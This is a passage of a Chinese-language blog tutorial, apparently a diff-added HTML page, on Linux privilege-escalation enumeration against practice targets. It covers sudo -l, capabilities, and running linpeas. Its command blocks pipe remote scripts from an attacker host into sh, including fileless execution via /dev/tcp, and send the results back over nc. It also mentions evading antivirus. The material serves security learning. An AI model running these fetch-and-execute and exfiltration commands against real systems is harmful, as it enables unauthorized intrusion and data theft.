+<h4 id="2-3-枚举网络和挂载"><a href="#2-3-枚举网络和挂载" class="headerlink" title="2.3 枚举网络和挂载"></a>2.3 枚举网络和挂载</h4><p>知道进程后的使用</p>
+<ul>
+<li><p><strong>网络连接</strong>：</p>
+<ul>
+<li><code>netstat -a</code> （-at是TCP  -au是UDP）或 <code>netstat -ano</code>（all    不解析名称    计时器timer）：显示所有网络连接和端口。</li>
+</ul>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718853.png" alt="image-20251125193909901" style="zoom:67%;" />
+
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718856.png" alt="image-20251124215958644" style="zoom:67%;" />
+
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155740272.png" alt="image-20251124220043378" style="zoom:67%;" />
+
+<p><code>netstat -l</code>：正在监听的端口</p>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154719277.png" alt="image-20251124220117965" style="zoom:67%;" />
+</li>
+<li><p><strong>挂载信息</strong>：</p>
+<ul>
+<li><code>cat /etc/fstab</code>：检测未挂载的硬盘和配置。（运维人员做快照&#x2F;备份时，会用另一块磁盘临时挂载上，运行后就“未挂载状态”。里面可能存在运维人员使用的备份，或敏感信息）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-4-枚举当前用户权限"><a href="#2-4-枚举当前用户权限" class="headerlink" title="2.4 枚举当前用户权限"></a>2.4 枚举当前用户权限</h4><ul>
+<li><code>sudo -l</code>查看当前用户有哪些以root身份执行的 <strong>（非常重要）</strong></li>
+</ul>
+<blockquote>
+<p>比如这里列出了mysql是可以无需密码的利用root权限执行的</p>
+</blockquote>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154719615.png" alt="image-20251124212531732"></p>
+<ul>
+<li><p><strong>capabilities</strong></p>
+<ul>
+<li><code>getcap -r / 2&gt;/dev/null</code>    查看“得到权限能力”根目录下的所有文件</li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154719770.png" alt="image-20251124213251483"></p>
+</li>
+</ul>
+<h3 id="3-自动化枚举工具"><a href="#3-自动化枚举工具" class="headerlink" title="3. 自动化枚举工具"></a>3. 自动化枚举工具</h3><p>优点：简单，速度快，信息全    不足：需要搬运文件，会产生流量或流量特征；结果很长冗余；难以针对化（如果对各段了解不深入）</p>
+<p>自动化工具可以快速扫描系统，发现潜在的提权漏洞。</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p>要看目标机器上豆安装了什么应用；系统版本…可能设有关键词屏蔽，一个不行另一个</p>
+</blockquote>
+<ul>
+<li><p><strong>PEASS-ng（linpeas.sh）</strong>：（最新，最常用，支持MAC OS &#x2F;Linux &#x2F;Windows）    一般四五分钟，十分钟之内</p>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155746810.png" alt="image-20251125195605364" style="zoom:50%;" />
+
+<ul>
+<li><p>功能强大，输出详细。</p>
+</li>
+<li><p>支持openSSL加密，和base64的加密，如果需要绕过，免杀会有一定的效果</p>
+</li>
+<li><p>使用方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一般方法，会在本地留下文件和痕迹</span></span><br><span class="line">wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">./linpeas.sh	<span class="comment">#执行</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#linpeas官方推荐最佳实践，管道符给到sh执行linpeas的脚本，最大的好处是直接在线下载，直接执行，并不在本地存有任何文件</span></span><br><span class="line">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh </span><br></pre></td></tr></table></figure>
+
+<p>扫描结果非常多，要具备手动枚举能力才能读懂</p>
+<blockquote>
+<ul>
+<li><strong>红&#x2F;黄</strong>：95% 概率是提权向量（RED 必看，Yellow 提醒）。</li>
+<li><strong>浅青</strong>：拥有控制台登录权限的用户。</li>
+<li><strong>蓝</strong>：无控制台用户 &amp; 已挂载设备。</li>
+<li><strong>绿</strong>：常规项（用户、组、SUID&#x2F;SGID、挂载点、.sh 脚本、cron）。</li>
+<li><strong>浅洋红</strong>：当前运行 LinPEAS 的用户名（你自己）。</li>
+</ul>
+</blockquote>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155752179.png" alt="image-20251125200430660" style="zoom:67%;" />
+
+
+
+
+
+<blockquote>
+<p>[!NOTE]</p>
+<p>假设靶机<strong>不能联网</strong>，如何利用linpeas</p>
+</blockquote>
+<p>现在kali用python3开启web服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server 80</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720117.png" alt="image-20251125201334255"></p>
+<p>​    靶机中</p>
+<p>​    </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl kaliip/linpeas.sh | sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720403.png" alt="image-20251125201442699"></p>
+<p>将结果传回本地阅读（因为有的靶机阅读不一定方便，还要对结果进行分析）</p>
+<p><strong>kali</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 -m http.server 80</span><br><span class="line"><span class="built_in">sudo</span> nc -lvnp 81 | <span class="built_in">tee</span> linpeas.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720550.png" alt="image-20251125201822766"></p>
+<p><strong>靶机</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl kaliip/linpeas.sh | sh | nc kaliip 81 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720710.png" alt="image-20251125201949936"></p>
+<p>这时，结果会显示在kali中，并且会把结果存入linpeas.txt（<strong>tee命令的作用，既显示又存储</strong>）</p>
+<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154721011.png" alt="image-20251125202143325" style="zoom: 33%;" />
+
+<ul>
+<li><p>查看输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less -r linpeas.txt		<span class="comment">#vi阅读性特别差</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154721036.png" alt="image-20251125202642868"></p>
+<p><strong>-r  是让颜色、进度条、表格线等 ANSI 转义序列原样显示，而不是打成 ^[[31m 一堆乱码。</strong></p>
+<blockquote>
+<p>[!NOTE]</p>
+<p><strong>靶机中curl不能用的情况</strong></p>
+</blockquote>
+<p><strong>kali</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nc -lvnp 80 &lt; linpeas.sh	<span class="comment">#将linpeas.sh重定向到80端口</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>nc -lvnp 80</code>：<ul>
+<li><code>-l</code> 进入监听（listen）模式；</li>
+<li><code>-v</code> 显示详细连接信息；</li>
+<li><code>-n</code> 禁止 DNS 解析，加快响应；</li>
+<li><code>-p 80</code> 指定本地端口为 80。</li>
+</ul>
+</li>
+<li><code>&lt; linpeas.sh</code>：把文件内容重定向到 nc 的标准输入，<strong>一旦有客户端连接，就把整份脚本按字节推送出去</strong>。</li>
+<li>结果<br>攻击机 80 端口变成 <strong>“一次性文件服务器”</strong></li>
+</ul>
+<p><strong>靶机</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt; /dev/tcp/kaliip/80 | sh	<span class="comment">#利用 Bash 内置的 /dev/tcp 伪设备，把远程脚本直接拉进内存并通过管道交给 sh 解释执行，全程不落盘。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154808103.png" alt="image-20251125203359192"></p>
+</li>
+</ul>
+</li>
+</ul>
+<p>没有curl也可以在内存中执行</p>
+<ul>
+<li><p><strong>LinEnum</strong>：</p>
+<ul>
+<li>较早的工具，适用于<strong>较老的系统</strong>，如果不支持linpeas，就选这个。</li>
+</ul>
+</li>
+<li><p><strong>Linux-smart-enumeration</strong>：</p>
+<ul>
+<li>智能枚举，根据系统环境调整。</li>
+</ul>
+</li>
+<li><p><strong>Linux-exploit-suggester</strong>：</p>
+<ul>
+<li>根据内核版本和系统信息，提供可用的漏洞利用建议。</li>
+</ul>
+</li>
+<li><p><strong>Linuxprivchecker</strong>：</p>
+<ul>
+<li><strong>Python 编写</strong>，提供详细的权限检查。</li>
+</ul>
+</li>
+<li><p><strong>unix-privesc-check</strong>：</p>
+<ul>
+<li>适用于 Unix 和 Linux 系统。</li>
+</ul>
+</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://lmlsama.github.io/2025/12/27/test1/" data-id="cuid2-mSme45mhgu1lckcQ3jS" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2025/12/27/%E9%9D%B6%E6%9C%BA%E7%B2%BE%E8%AE%B2%EF%BC%9ACONNECT-THE-DOTS/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">靶机精讲：CONNECT THE DOTS</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/12/">December 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/12/27/test1/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/12/27/%E9%9D%B6%E6%9C%BA%E7%B2%BE%E8%AE%B2%EF%BC%9ACONNECT-THE-DOTS/">靶机精讲：CONNECT THE DOTS</a>
+          </li>
+        
+          <li>
+            <a href="/2025/12/26/%E6%8F%90%E6%9D%83%E7%B2%BE%E8%AE%B2/">提权精讲</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
